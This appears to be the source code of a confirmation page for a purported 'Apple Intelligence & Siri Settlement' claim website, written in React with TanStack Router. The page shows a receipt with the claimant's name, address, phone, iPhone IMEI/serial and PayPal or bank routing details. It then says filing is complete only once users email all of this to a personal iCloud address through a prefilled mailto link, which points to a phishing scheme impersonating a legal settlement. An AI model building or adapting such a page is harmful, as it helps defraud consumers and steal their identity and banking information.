import { createFileRoute, Link } from "@tanstack/react-router";
import { z } from "zod";
import { useEffect, useState } from "react";
import { CheckCircle2, Mail, Printer, Copy, ArrowRight } from "lucide-react";
import { toast } from "sonner";

const searchSchema = z.object({
  id: z.string().optional(),
});

export const Route = createFileRoute("/confirmation")({
  validateSearch: searchSchema,
  head: () => ({
    meta: [
      { title: "Claim Submitted — Apple Intelligence & Siri Settlement" },
      { name: "description", content: "Your claim has been successfully submitted." },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: Confirmation,
});

const SUPPORT_EMAIL = "applesettlementclaim@icloud.com";

const PAYMENT_NAMES: Record<string, string> = {
  paypal: "PayPal",
  ach: "ACH Direct Deposit",
  echeck: "Electronic Check",
  paper: "Paper Check",
};

type Receipt = {
  id: string;
  submittedAt: string;
  tier: string;
  tierName: string;
  amount: number;
  firstName: string; lastName: string; email: string; phone: string;
  address: string; city: string; stateVal: string; zip: string;
  deviceInfo: string;
  purchaseDate?: string;
  imeiSerial?: string;
  proofFileName: string | null;
  payment: string;
  paypalEmail: string;
  accountType: string;
  routing: string;
  accountLast4: string;
  mailingSameAsAddress: boolean;
};

function currency(n: number) {
  return n.toLocaleString("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 0 });
}

function buildEmailBody(r: Receipt): string {
  const paymentDetails =
    r.payment === "paypal" ? `PayPal Email: ${r.paypalEmail}` :
    r.payment === "ach" ? `Account Type: ${r.accountType}\nRouting Number: ${r.routing}\nAccount Number (last 4): ••••${r.accountLast4}` :
    r.payment === "echeck" ? `Electronic check will be delivered to: ${r.email}` :
    r.payment === "paper" ? `Paper check mailing address: ${r.mailingSameAsAddress ? "Same as address above" : "See address above"}` : "";

  return [
    "APPLE INTELLIGENCE & SIRI SETTLEMENT — CLAIM SUBMISSION",
    "=========================================================",
    "",
    `Claim ID:        ${r.id}`,
    `Submitted:       ${new Date(r.submittedAt).toLocaleString()}`,
    `Claim Type:      ${r.tierName}`,
    `Claim Amount:    ${currency(r.amount)}`,
    "",
    "-- CLAIMANT INFORMATION --",
    `Full Name:       ${r.firstName} ${r.lastName}`,
    `Email:           ${r.email}`,
    `Phone:           ${r.phone || "(not provided)"}`,
    `Mailing Address: ${r.address}, ${r.city}, ${r.stateVal} ${r.zip}`,
    "",
    "-- DEVICE INFORMATION --",
    `iPhone Model:    ${r.deviceInfo}`,
    `Date Purchased:  ${r.purchaseDate ? new Date(r.purchaseDate).toLocaleDateString() : "(not provided)"}`,
    `IMEI / Serial:   ${r.imeiSerial ?? "(not provided)"}`,
    "",
    r.proofFileName ? `Proof of Ownership Uploaded: ${r.proofFileName}` : "",
    "",
    "-- PAYMENT METHOD --",
    `Method: ${PAYMENT_NAMES[r.payment] ?? r.payment}`,
    paymentDetails,
    "",
    "=========================================================",
    "Please retain this receipt for your records.",
  ].filter(Boolean).join("\n");
}

function Confirmation() {
  const { id } = Route.useSearch();
  const [receipt, setReceipt] = useState<Receipt | null>(null);

  useEffect(() => {
    if (!id) return;
    try {
      const raw = sessionStorage.getItem(`claim:${id}`);
      if (raw) setReceipt(JSON.parse(raw) as Receipt);
    } catch { /* ignore */ }
  }, [id]);

  if (!id) {
    return (
      <section className="mx-auto max-w-2xl px-4 py-24 text-center">
        <h1 className="text-2xl font-semibold">No claim found</h1>
        <p className="mt-2 text-muted-foreground">Start a new claim to see your confirmation.</p>
        <Link to="/claim" className="mt-6 inline-flex items-center rounded-lg bg-primary px-5 py-2.5 text-sm font-semibold text-primary-foreground">File a claim</Link>
      </section>
    );
  }

  const emailBody = receipt ? buildEmailBody(receipt) : "";
  const mailtoHref = receipt
    ? `mailto:${SUPPORT_EMAIL}?subject=${encodeURIComponent(`Claim Submission — ${receipt.id}`)}&body=${encodeURIComponent(emailBody)}`
    : `mailto:${SUPPORT_EMAIL}`;

  const copyReceipt = async () => {
    try {
      await navigator.clipboard.writeText(emailBody);
      toast.success("Receipt copied to clipboard");
    } catch {
      toast.error("Couldn't copy — please select and copy manually.");
    }
  };

  return (
    <section className="mx-auto max-w-3xl px-4 py-12 sm:py-16 print:py-0">
      {/* Success header */}
      <div className="rounded-2xl border border-border bg-card p-8 text-center shadow-elevated sm:p-10 print:border-0 print:shadow-none">
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-success/10 text-success print:hidden">
          <CheckCircle2 className="h-9 w-9" />
        </div>
        <h1 className="mt-6 text-3xl font-bold tracking-tight sm:text-4xl">Claim submitted successfully</h1>
        <p className="mt-3 text-muted-foreground">
          Your claim has been received. Please email a copy of this receipt to <strong className="text-foreground">{SUPPORT_EMAIL}</strong> to complete filing.
        </p>

        <div className="mt-6 inline-flex flex-col items-center rounded-xl border border-border bg-muted/40 px-6 py-4">
          <div className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">Your Claim ID</div>
          <div className="mt-1 font-mono text-xl font-bold">{id}</div>
        </div>

        {/* Action buttons */}
        <div className="mt-6 flex flex-wrap items-center justify-center gap-3 print:hidden">
          <a
            href={mailtoHref}
            className="inline-flex items-center gap-2 rounded-lg bg-primary px-5 py-2.5 text-sm font-semibold text-primary-foreground shadow-card transition hover:opacity-90"
          >
            <Mail className="h-4 w-4" /> Email Receipt to {SUPPORT_EMAIL}
          </a>
          <button onClick={copyReceipt} className="inline-flex items-center gap-2 rounded-lg border border-border bg-background px-4 py-2.5 text-sm font-medium transition hover:bg-secondary">
            <Copy className="h-4 w-4" /> Copy
          </button>
          <button onClick={() => window.print()} className="inline-flex items-center gap-2 rounded-lg border border-border bg-background px-4 py-2.5 text-sm font-medium transition hover:bg-secondary">
            <Printer className="h-4 w-4" /> Print
          </button>
        </div>
      </div>

      {/* Full receipt */}
      {receipt && (
        <div className="mt-8 overflow-hidden rounded-2xl border border-border bg-card shadow-card print:border-0 print:shadow-none">
          <div className="border-b border-border bg-muted/30 px-6 py-4">
            <div className="text-xs font-semibold uppercase tracking-widest text-muted-foreground">Claim Submission Receipt</div>
            <div className="mt-0.5 text-sm text-foreground">Submitted {new Date(receipt.submittedAt).toLocaleString()}</div>
          </div>
          <div className="divide-y divide-border px-6">
            <Section title="Claim Details">
              <Row label="Claim ID" value={receipt.id} mono />
              <Row label="Claim Type" value={receipt.tierName} />
              <Row label="Claim Amount" value={currency(receipt.amount)} highlight />
            </Section>

            <Section title="Claimant Information">
              <Row label="Full Name" value={`${receipt.firstName} ${receipt.lastName}`} />
              <Row label="Email Address" value={receipt.email} />
              <Row label="Cell Phone Number" value={receipt.phone || "—"} />
              <Row label="Mailing Address" value={`${receipt.address}, ${receipt.city}, ${receipt.stateVal} ${receipt.zip}`} />
            </Section>

            <Section title="Device Information">
              <Row label="iPhone Model" value={receipt.deviceInfo} />
              <Row label="Date Purchased" value={receipt.purchaseDate ? new Date(receipt.purchaseDate).toLocaleDateString() : "—"} />
              <Row label="IMEI / Serial Number" value={receipt.imeiSerial || "—"} mono />
              {receipt.proofFileName && <Row label="Proof of Ownership" value={receipt.proofFileName} />}
            </Section>

            <Section title="Payment Method">
              <Row label="Method" value={PAYMENT_NAMES[receipt.payment] ?? receipt.payment} />
              {receipt.payment === "paypal" && <Row label="PayPal Email" value={receipt.paypalEmail} />}
              {receipt.payment === "ach" && (
                <>
                  <Row label="Account Type" value={receipt.accountType} />
                  <Row label="Routing Number" value={receipt.routing} mono />
                  <Row label="Account Number" value={"••••" + receipt.accountLast4} mono />
                </>
              )}
              {receipt.payment === "echeck" && <Row label="Delivered To" value={receipt.email} />}
              {receipt.payment === "paper" && <Row label="Mail To" value={receipt.mailingSameAsAddress ? "Address above" : "See address above"} />}
            </Section>
          </div>

          <div className="border-t border-border bg-muted/30 px-6 py-4 text-xs text-muted-foreground">
            Retain this receipt for your records. A copy should be emailed to <strong className="text-foreground">{SUPPORT_EMAIL}</strong>.
          </div>
        </div>
      )}

      {/* Next steps */}
      <div className="mt-8 rounded-xl border border-border bg-background p-5 print:hidden">
        <div className="flex items-start gap-3">
          <Mail className="mt-0.5 h-5 w-5 shrink-0 text-accent" />
          <div className="text-sm text-muted-foreground">
            <div className="font-semibold text-foreground">Next step — email your receipt</div>
            <div className="mt-1">
              Tap the button above to open your email app with all your claim information pre-filled and addressed to{" "}
              <a className="font-medium text-foreground underline" href={`mailto:${SUPPORT_EMAIL}`}>{SUPPORT_EMAIL}</a>. Then simply press Send.
            </div>
          </div>
        </div>
      </div>

      <div className="mt-6 text-center print:hidden">
        <Link to="/" className="inline-flex items-center gap-2 text-sm font-medium text-accent hover:underline">
          Return home <ArrowRight className="h-4 w-4" />
        </Link>
      </div>
    </section>
  );
}

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="py-4">
      <div className="mb-1 text-xs font-semibold uppercase tracking-widest text-muted-foreground">{title}</div>
      <div className="divide-y divide-border/60">{children}</div>
    </div>
  );
}

function Row({ label, value, mono, highlight }: { label: string; value: string; mono?: boolean; highlight?: boolean }) {
  return (
    <div className="flex flex-col gap-1 py-2.5 sm:flex-row sm:items-start sm:justify-between sm:gap-6">
      <div className="text-sm text-muted-foreground">{label}</div>
      <div className={`text-sm sm:max-w-[60%] sm:text-right ${mono ? "font-mono" : ""} ${highlight ? "text-base font-bold" : "font-medium"}`}>{value}</div>
    </div>
  );
}
